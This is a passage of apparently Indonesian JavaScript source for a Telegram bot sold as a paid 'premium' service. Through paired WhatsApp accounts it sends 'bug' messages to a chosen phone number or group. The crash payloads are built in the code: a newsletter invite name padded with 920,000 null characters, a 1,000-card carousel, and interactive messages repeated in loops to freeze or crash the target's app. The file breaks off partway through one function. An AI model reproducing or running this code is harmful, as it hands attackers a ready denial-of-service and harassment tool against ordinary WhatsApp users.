const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const axios = require('axios');
const path = require("path");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    proto,
    prepareWAMessageMedia,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require('chalk');
const { BOT_TOKEN } = require("./setting/config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
let bots = [];

//========================================================\\ 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/fressty/kampank/main/token.json";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data; 
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token database di GitHub!"), error.message);
        return [];
    }
}

async function validateToken() {
    console.log(chalk.blue("Loading Check Token Bot..."));
    const validTokens = await fetchValidTokens();

    if (!validTokens.tokens || !Array.isArray(validTokens.tokens)) {
        console.log(chalk.red("Data token tidak valid dari GitHub!"));
        process.exit(1);
    }

    if (!validTokens.tokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("Token Tidak Terdaftar Di Database! Silahkan Hubungi @xnxxsigma"));
        process.exit(1);
    }

    console.clear();
    console.log(chalk.bold.white("✅ Token Valid! Menyiapkan Bot...\n"));
}

//========================================================\\

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let paw = null;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const imageUrl = "https://files.catbox.moe/ktuerk.jpg";

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const paw = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          paw.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, paw);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          paw.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
  const chatId = ctx.chat.id;

  const sentMsg = await ctx.telegram.sendMessage(
    chatId,
    `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: "Markdown" }
  );

  const statusMessage = sentMsg.message_id;

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const paw = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  paw.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, paw);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        chatId,
        statusMessage,
        null,
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
        { parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await paw.requestPairingCode(botNumber, "XPAWXXX1");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await ctx.telegram.editMessageText(
            chatId,
            statusMessage,
            null,
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            { parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          chatId,
          statusMessage,
          null,
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━`,
          { parse_mode: "Markdown" }
        );
      }
    }
  });

  paw.ev.on("creds.update", saveCreds);

  return paw;
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(imageUrl, {
      caption: "```\nБлядь, ты не премиум...\n```",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/xnxxsigma" }],
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/xnxxsigma" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/fckbitchbruh" }]
        ]
      }
    });
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

//++++++++++++++++++++++++++++++++++++++++++//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//++++++++++++++++++++++++++++++++++++++++++//

bot.command('start', async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const isPremium = premiumUsers.includes(userId);
  const premiumStatus = isPremium ? '✅' : '❌';
  const username = ctx.from.first_name || ctx.from.username || "User";

  await ctx.replyWithPhoto(imageUrl, {
  caption: `\`\`\`
🍂𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
\`\`\`( 👀 ) 𝗛𝗼𝗹𝗮𝗮 ☇ ${username} 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝘄𝗶𝘀𝗲𝗹𝘆, 𝘁𝗵𝗲 𝗰𝗿𝗲𝗮𝘁𝗼𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲 𝗳𝗼𝗿 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝗱𝗼 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁, 𝗲𝗻𝗷𝗼𝘆.

⬡ Author : AcpawXOne¡?
⬡ Version : 1.0
⬡ Framework : Telegraf
⬡ Prefix : /
⬡ Premium : ${premiumStatus}

© RenXshiro-Style 2K2#`,
  parse_mode: 'Markdown',
  reply_markup: {
    inline_keyboard: [
      [
        { text: "𝐌𝐚𝐭𝐫𝐢𝐱˚𝐓𝐫𝐚𝐬𝐡", callback_data: "bugmenu" },
        { text: "𝐋𝐞𝐨𝐧˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "ownermenu" }
      ],
      [{ text: "𝟳𝟳𝟳!", callback_data: "thanksto" }],
      [{ text: "𝐌𝐚𝐭𝐫𝐢𝐱", url: "https://t.me/x1deakv" }]
    ]
  }
});
});

//======================= [ action ] =========================\\ 
bot.on("callback_query", async (ctx) => {
  const userId = ctx.from?.id?.toString() || '';
  const message = ctx.callbackQuery?.message;
  const data = ctx.callbackQuery?.data;

  if (!message || !message.chat) {
    console.error("callbackQuery.message atau .chat tidak tersedia.");
    return ctx.answerCbQuery("Terjadi kesalahan.");
  }

  const chatId = message.chat.id;
  const messageId = message.message_id;
  const newImage = imageUrl;
  const isPremium = premiumUsers.includes(userId);
  const premiumStatus = isPremium ? '✅' : '❌';
  const username = ctx.from.first_name || ctx.from.username || "User";
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = "```\n🦠 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕\n──────────────────────────\n ━ 𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.\n\n ▢ /xsᴛᴜɴ ʊ ɴᴜᴍʙᴇʀ\n ▢ /xᴄʀᴀsʜ ʊ ɴᴜᴍʙᴇʀ\n ▢ /xsʏsᴛᴇᴍᴜɪ ʊ ɴᴜᴍʙᴇʀ\n ▢ /ʙʟᴀɴᴋɢᴄ ʊ ʟɪɴᴋ/ɪᴅ```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = "```\n👀 𝘖 𝘞 𝘕 𝘌 𝘙 - 𝘔 𝘌 𝘕 𝘜 \n──────────────────────────\n▢ /addprem <id> <day>\n╰➤ Menambahkan akses pada user\n\n▢ /delprem <id>\n╰➤ Menghapus akses pada user\n\n▢ /cekprem \n╰➤ Melihat waktu/status prem\n\n▢ /listbot \n╰➤ Melihat jumlah sender```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = "```\n👏 𝘛 𝘏 𝘈 𝘕 𝘒 𝘚  -  𝘛 𝘖 𝘖 \n──────────────────────────\n▢ Kyuurzy\n▢ Dimas bau\n▢ Lotus\n▢ RenXiter ( display inspiration )\n\n▢ AxpawX1 ( Developer )\nn thanks for dark angel n show of bug```";
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `\`\`\`
🍂𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
\`\`\`( 👀 ) Holaa ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.

⬡ Author : AcpawXOne¡?
⬡ Version : 1.0
⬡ Framework : Telegraf
⬡ Prefix : /
⬡ Premium : ${premiumStatus}

© RenXshiro-Style 2K2#`;
    newButtons = [
      [
        { text: "𝐌𝐚𝐭𝐫𝐢𝐱˚𝐓𝐫𝐚𝐬𝐡", callback_data: "bugmenu" },
        { text: "𝐋𝐞𝐨𝐧˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "ownermenu" }
      ],
      [{ text: "𝟳𝟳𝟳!", callback_data: "thanksto" }],
      [{ text: "𝐌𝐚𝐭𝐫𝐢𝐱", url: "https://t.me/x1deakv" }]
    ];
  }

  try {
    await ctx.telegram.editMessageMedia(chatId, messageId, null, {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "Markdown"
    });

    await ctx.telegram.editMessageReplyMarkup(chatId, messageId, null, {
      inline_keyboard: newButtons
    });
  } catch (err) {
    console.error("Error editing message:", err);
    ctx.answerCbQuery("Terjadi kesalahan saat memperbarui pesan.");
  }
});

//====================== [ cmd bug ] ============================\\ 

bot.command('xstun', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /xstun 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${target}
тип ошибки: Xstun
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) continue;

        for (let i = 0; i < 1; i++) {
          await DurationTrick(paw, 24, target);
          await sleep(2000)
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command('xcrash', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /xcrash 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${target}
тип ошибки: Xcrash
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) continue;

        for (let i = 0; i < 100; i++) {
          await FlowXUi(paw, target);
          await sleep(1000);
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command('xsystemui', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /xsystemui 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${target}
тип ошибки: Xsystemui
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, paw] of sessions.entries()) {
      try {
        if (!paw.user) continue;

        for (let i = 0; i < 25; i++) {
          await Uipaw(paw, target);
          await sleep(1000);
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim bug:", err);
  }
});

bot.command("blankgc", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /blankgc https://chat.whatsapp.com/xxxx atau /blankgc 1203xxxxxx@g.us`);
  }

  if (sessions.size === 0) {
    return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/k25ovn.jpg",
    filename: "ᔫ 𖣂 𝐀𝐏𝐎𝐂𝐀ˊˊ𝐋𝐘𝐏𝐒𝐄 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\`\`\`
Цель: ${displayUrl}
тип ошибки: Blankgc
Статус: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🥑 Успешно отправлено в цель
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤˚𝐌𝐞𝐧𝐨𝐮𝐬", callback_data: "bugmenu" }]
      ]
    }
  });

  // Eksekusi tanpa balasan hasil
  for (const [botNum, paw] of sessions.entries()) {
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await paw.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 5; i++) {
        await NewsletterZapTeks(paw, target);
        await sleep(1000);
      }

    } catch (err) {
      console.log(`Bot ${botNum} error:`, err.message);
    }
  }
});

//list bot
bot.command('listbot', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let xpawpaw = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${xpawpaw}. ${botNumber}\n`;
      xpawpaw++;
    }

    ctx.reply(
      `#- 𝘓 𝘐 𝘚 𝘛 - 𝘉 𝘖 𝘛
╰➤ Daftar bot yang terhubung\n\n▢ ${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk addsender WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");
    }

    const inputNumber = args[1];
    const botNumber = inputNumber.replace(/[^0-9]/g, "");
    const chatId = ctx.chat.id;

    try {
        await connectToWhatsApp(botNumber, ctx);
    } catch (error) {
        console.error("Error in addsender:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('xpawpaw', (err) => { // 'xpawpaw' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
// ========================= [ FUNC GRUP ] ========================= \\
async function NewsletterZapTeks(paw, target) {
  const isGroup = target.endsWith("@g.us");

  const newsletterMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363298524333143@newsletter`,
          newsletterName: "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
          jpegThumbnail: "",
          caption: `𝐀͢𝐩𝐨͡𝐜𝐚ܢ𝐥𝐲𝐩͞𝐬𝐞⃟`,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  }), {
    userJid: target
  });

  await paw.relayMessage(target, newsletterMessage.message, isGroup ? {
    messageId: newsletterMessage.key.id
  } : {
    messageId: newsletterMessage.key.id,
    participant: { jid: target }
  });

  await new Promise(resolve => setTimeout(resolve, 500)); // delay

  const textMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
    conversation: "𝐀͢𝐩𝐨͡𝐜𝐚ܢ𝐥𝐲𝐩͞𝐬𝐞⃟"
  }), {
    userJid: target
  });

  await paw.relayMessage(target, textMessage.message, isGroup ? {
    messageId: textMessage.key.id
  } : {
    messageId: textMessage.key.id,
    participant: { jid: target }
  });
}

// ========================= [ FUNC ] ========================= \\
async function carousels2(paw, target, fJids) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: paw.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: 'คƿ૦८คՆעƿઽ૯ ๑ ცค८қ',
    gifPlayback: false,
    subtitle: 'คƿ૦८คՆעƿઽ૯ ๑ ცค८қ',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "คƿ૦८คՆעƿઽ૯ ๑ ცค८қ"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "คƿ૦८คՆעƿઽ૯ ๑ ცค८қ"
            },
            footer: {
              text: "คƿ૦८คՆעƿઽ૯ ๑ ცค८қ"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );
  
  await paw.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: null } }
      : {}
  );
}

let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib_dirty": ["Array"] },
            _evntsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true,
            }
        }
    }
});

async function FlowXUi(paw, target) {

     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false,
                            },
                            body: {
                                text: "𝐀͢𝐩𝐨͡𝐜𝐚ܢ𝐥𝐲𝐩͞𝐬𝐞⃟",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
